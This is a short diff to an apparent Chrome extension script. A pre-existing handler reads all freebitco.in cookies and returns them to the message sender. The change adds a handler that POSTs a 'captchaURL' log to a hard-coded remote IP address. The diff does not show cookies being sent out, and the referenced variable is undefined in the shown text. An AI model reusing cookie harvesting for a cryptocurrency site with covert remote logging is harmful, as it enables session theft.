@@ -1,4 +1,7 @@
-setTimeout(close, 1000 * 60 * 5);
+//var serverURL = "http://127.0.0.1";
+var serverURL = "http://78.139.234.190";
+
+setTimeout(close, 1000 * 60 * 10);
 
 chrome.runtime.onMessage.addListener(
 	function(request, sender, sendResponse) {
@@ -10,6 +13,15 @@ chrome.runtime.onMessage.addListener(
 		if (type == 'cookies')
 			chrome.cookies.getAll({url: 'http://freebitco.in'}, function(cookies) { 
 				sendResponse(cookies);
+			});
+		
+		if (type == 'proxy')
+			chrome.proxy.settings.get({}, function(config) {
+				$.ajax({
+					url: serverURL,
+					type: 'post',
+					data: { type: 'log', proxy: captchaURL },
+				});
 			});
 });
 
